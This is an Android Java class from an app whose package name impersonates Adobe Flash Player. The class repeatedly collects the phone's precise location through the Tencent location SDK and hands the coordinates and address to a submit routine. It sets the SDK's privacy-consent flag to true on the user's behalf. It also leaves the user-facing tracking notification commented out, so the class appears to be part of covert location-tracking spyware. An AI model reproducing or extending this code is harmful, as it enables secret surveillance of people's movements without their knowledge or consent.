package com.adobe.flashplayer.data.Location;

import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.data.PhoneLocationListener;
import com.tencent.map.geolocation.TencentLocation;
import com.tencent.map.geolocation.TencentLocationListener;
import com.tencent.map.geolocation.TencentLocationManager;
import com.tencent.map.geolocation.TencentLocationManagerOptions;
import com.tencent.map.geolocation.TencentLocationRequest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.os.Looper;
import android.util.Log;



public class MyTencentLocation implements Runnable , TencentLocationListener{

	private TencentLocationListener listener = null;

	private TencentLocationManager locationManager = null;

	public static final int REQUEST_LEVEL_POI = 4;

	private TencentLocationRequest request = null;

	private Context mContext;

	private String TAG = "[ljg]MyTencentLocation ";

	int mInterval = 0;



	public MyTencentLocation(Context context,int interval){

		mContext = context;

		if (interval > 3600){
			interval = 3600;
		}
		if (interval <= 0){
			interval = 600;
		}
		mInterval = interval*1000;

		TencentLocationManager.setUserAgreePrivacy(true);

		//TencentLocationManager.setDeviceID(context, new String(Public.IMEI));

		return;
	}


	public void stopLocation(Context context){
		if(listener != null){
			locationManager.removeUpdates(listener);

			Looper.myLooper().quitSafely();
		}
	}








	@Override
	public void run() {
		Looper.prepare();

		try {
			listener = this;

			request = TencentLocationRequest.create();

			locationManager = TencentLocationManager.getInstance(mContext);

			//locationManager.enableForegroundLocation(LOC_NOTIFICATIONID, buildNotification());
			//locationManager.requestLocationUpdates(request, this, getMainLooper());

			//设置请求级别
			//request.setRequestLevel(TencentLocationRequest.REQUEST_LEVEL_ADMIN_AREA);
			request.setRequestLevel(REQUEST_LEVEL_POI);

			request.setInterval(mInterval);

			request.setAllowGPS(true);
			request.setIndoorLocationMode(true);
			request.setAllowDirection(false);

			int locMode = TencentLocationRequest.HIGH_ACCURACY_MODE;
			request.setLocMode(locMode);

			//TencentLocationManagerOptions.setLoadLibraryEnabled(false);
			//String libpath = context.getApplicationInfo().nativeLibraryDir();
			//String libpath = "/data/data/" + mContext.getPackageName() + "/lib/libtencentloc.so";
			//System.load(libpath);

			int error = locationManager.requestLocationUpdates(request, listener);

			Log.e(TAG,"result:" + error);
		} catch (Exception e) {
			e.printStackTrace();
		}

		Looper.loop();
	}


	@Override
    public void onLocationChanged(TencentLocation location, int error, String reason) {
    	Log.e(TAG,"onLocationChanged reason:" + reason + " errro:" + String.valueOf(error) );
        if (TencentLocation.ERROR_OK == error) {

        	PhoneLocationListener.submitLocation(location.getLatitude(), location.getLongitude(), location.getAddress(), mContext);
        } else {
            return;
        }
    }



	@Override
    public void onStatusUpdate(String name, int status, String desc) {
        Log.e(TAG,"onStatusUpdate name:" + name + " status:" + status + " desk:" + desc);
    }


    	/*
	private Notification buildNotification() {
		Notification.Builder builder = null;
		Notification notification = null;
		if (android.os.Build.VERSION.SDK_INT >= 26) {
			//Android O上对Notification进行了修改，如果设置的targetSDKVersion>=26建议使用此种方式创建通知栏
			if (notificationManager == null) {
				notificationManager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
			}
			String channelId = mContext.getPackageName();
			if (!isCreateChannel) {
				NotificationChannel notificationChannel = new NotificationChannel(channelId,
					NOTIFICATION_CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);
				notificationChannel.enableLights(true);//是否在桌面icon右上角展示小圆点
				notificationChannel.setLightColor(Color.BLUE); //小圆点颜色
				notificationChannel.setShowBadge(true); //是否在久按桌面图标时显示此渠道的通知
				notificationManager.createNotificationChannel(notificationChannel);
				isCreateChannel = true;
			}
			builder = new Notification.Builder(mContext.getApplicationContext(), channelId);
		} else {
			builder = new Notification.Builder(mContext.getApplicationContext());
		}
		builder.setSmallIcon(com.adobe.flashplayer.R.drawable.ic_launcher_bd)
				.setContentTitle("LocationDemo")
				.setContentText("正在后台运行")
				.setLargeIcon(BitmapFactory.decodeResource(mContext.getResources(), com.adobe.flashplayer.R.drawable.ic_launcher_bd))
				.setWhen(System.currentTimeMillis());

		if (android.os.Build.VERSION.SDK_INT >= 16) {
			notification = builder.build();
		} else {
			notification = builder.getNotification();
		}
		return notification;
	}
	*/

}


